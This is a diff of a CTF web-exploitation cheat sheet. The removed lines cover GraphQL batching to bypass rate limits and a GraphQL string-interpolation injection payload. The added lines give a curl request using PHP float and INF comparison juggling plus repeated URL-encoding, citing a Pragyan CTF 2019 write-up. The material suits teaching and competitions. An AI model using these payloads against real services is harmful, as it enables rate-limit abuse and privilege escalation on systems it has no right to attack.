-  # ... repeat 1337 times
-}
-
-# Or via array batching (if supported):
-# POST body: [{"query":"mutation{vote(id:\"x\"){ok}}"}, {"query":"mutation{vote(id:\"x\"){ok}}"}, ...]
+```bash
+curl 'http://target/?val1=a&val2=1&val3=1&val4=7E1000&val5=a&val6=%2525252525252525252557oAHh!'
 ```
 
-### String Interpolation Injection
+**Key insight:** PHP float comparison accepts `INF == INF`; any math-style equality check becomes trivial if you can push both sides past `DBL_MAX`. Hashes stringified into floats collapse to 0 or INF, so `sha256(x) ** 0.5` and `log*()` are classic "juggling" primitives. For recursive decoder loops, the fixed point of repeated urldecode is "no `%` left"; encode one character N times with `%25` padding to force exactly N passes.
 
-```javascript
-// Vulnerable server code pattern:
-const query = `mutation { doAction(input: "${userInput}") { result } }`;
-
-// Injection payload:
-// userInput = ") { result } } mutation { adminAction(secret: true) { flag } } #"
-// Resulting query:
-// mutation { doAction(input: "") { result } } mutation { adminAction(secret: true) { flag } } #") { result } }
-```
-
-**Key insight:** GraphQL combines query language power with REST-like endpoints. Three main attack surfaces: (1) introspection reveals the full API schema, (2) query batching/aliasing bypasses rate limits and multiplies actions, (3) string interpolation in server-side query construction enables injection similar to SQLi.
+**References:** Pragyan CTF 2019 — Mandatory PHP, writeup 13837
 
 ---
 
-*See also: [server-side-exec.md](server-side-exec.md) for code execution attacks (Ruby/Perl/JS/LaTeX/Prolog injection, PHP preg_replace /e, ReDoS, file upload to RCE, PHP deserialization, XPath injection, Thymeleaf SpEL SSTI), and [server-side-exec-2.md](server-side-exec-2.md) for SQLi keyword fragmentation, SQL WHERE bypass, SQL via DNS, bash brace expansion, Common Lisp injection, PHP7 OPcache, PNG/PHP polyglot upload, and more.*
+See [server-side-2.md](server-side-2.md) for XXE, XML injection, command injection, GraphQL, and the remaining PHP-specific tricks (variable variables, uniqid, sequential regex bypass).
